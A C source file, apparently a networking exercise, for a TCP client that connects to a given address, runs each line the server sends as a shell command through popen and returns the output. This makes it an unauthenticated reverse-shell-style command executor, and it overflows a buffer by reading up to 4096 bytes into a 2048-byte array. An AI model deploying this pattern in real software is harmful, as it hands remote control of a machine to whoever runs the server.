#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <pthread.h>

#define MAXLINE 4096

int Socket(int family, int type, int flags) {
  int sockfd;
  if ((sockfd = socket(family, type, flags)) < 0) {
    perror("socket");
    exit(1);
  }
  else {
    return sockfd;
  }
}

int convertFromStringToInt(char *string) {
   char *p;
   return strtol(string, &p, 10);
}

void Connect(int sockfd, struct sockaddr_in *servaddr, socklen_t len) {
   if (connect(sockfd, (struct sockaddr *)servaddr, len) < 0) {
      perror("connect");
      exit(1);
   }
}

char *reverseString(char* str) {
   
   int index = 0, recvline_len = strlen(str);
   char* reversedString = malloc(sizeof(char*) * recvline_len);

   for(int i=recvline_len-1; i>=0; i--) {
      reversedString[index] = str[i];
      index++;
   }
   reversedString[index] = '\n';

   return reversedString;
}

int shouldExit(char* str) {
   if(strcmp(str, "exit") == 0) {
      return 1;
   }
   return 0;
}

int main(int argc, char **argv) {
   int sockfd, n;
   char recvline[MAXLINE + 1];
   char buf[MAXLINE + 1];
   char error[MAXLINE + 1];
   char source[MAXLINE/2];
   struct sockaddr_in servaddr;
   FILE* command_result;

   // The second argument expected is the ipaddres for connection
   if (argc < 3) {
      strcpy(error,"uso: ");
      strcat(error,argv[0]);
      strcat(error," <IPaddress>");
      strcat(error," <Port>");
      perror(error);
      exit(1);
   }

   int port = convertFromStringToInt(argv[2]);

   sockfd = Socket(AF_INET, SOCK_STREAM, 0); // Creating socket

   // Setting the server ip addres, the connection type (TCP) and the connection port
   bzero(&servaddr, sizeof(servaddr));
   servaddr.sin_family = AF_INET;
   servaddr.sin_port   = htons(port);

   // Converting conection from text to binary
   if (inet_pton(AF_INET, argv[1], &servaddr.sin_addr) <= 0) {
      perror("inet_pton error");
      exit(1);
   }

   // Establishing the connection
   Connect(sockfd, &servaddr, sizeof(servaddr));

   // Printing server and peer address
   struct sockaddr_in peeraddr;
   u_int servaddr_len = sizeof(servaddr), peeraddr_len = sizeof(peeraddr);

   if (getsockname(sockfd, (struct sockaddr *)&servaddr, &servaddr_len) < 0)
      perror("getsockname");

   if (getpeername(sockfd, (struct sockaddr *)&peeraddr, &peeraddr_len) < 0)
      perror("getpeername");

   printf("Server address: %s:%d\n", inet_ntoa(peeraddr.sin_addr), ntohs(peeraddr.sin_port));
   printf("Client socket: %s:%d\n", inet_ntoa(servaddr.sin_addr), ntohs(servaddr.sin_port));

   // Receiving the messages from server, buffering and printing it
   while ( (n = read(sockfd, recvline, MAXLINE)) > 0) {
      recvline[n] = 0;

      if (shouldExit(recvline) == 1) {
         snprintf(buf, sizeof(char) * MAXLINE + 1, "%s", "exit");
         write(sockfd, buf, strlen(buf));
         exit(0);
      }

      command_result = popen(recvline, "r");
      size_t newLen = fread(source, sizeof(char), MAXLINE, command_result);
      if (ferror(command_result) != 0) {
         fputs("Error reading file", stderr);
      } else {
         source[newLen++] = '\0';
      }

      // if (fputs(reverseString(recvline), stdout) == EOF) {
      //    perror("fputs error");
      //    exit(1);
      // }

      sleep(50);

      snprintf(buf, sizeof(char) * MAXLINE + 1, "%s:%d %s", inet_ntoa(servaddr.sin_addr), ntohs(servaddr.sin_port), source);
      write(sockfd, buf, strlen(buf));
   }

   if (n < 0) {
      perror("read error");
      exit(1);
   }

   exit(0);
}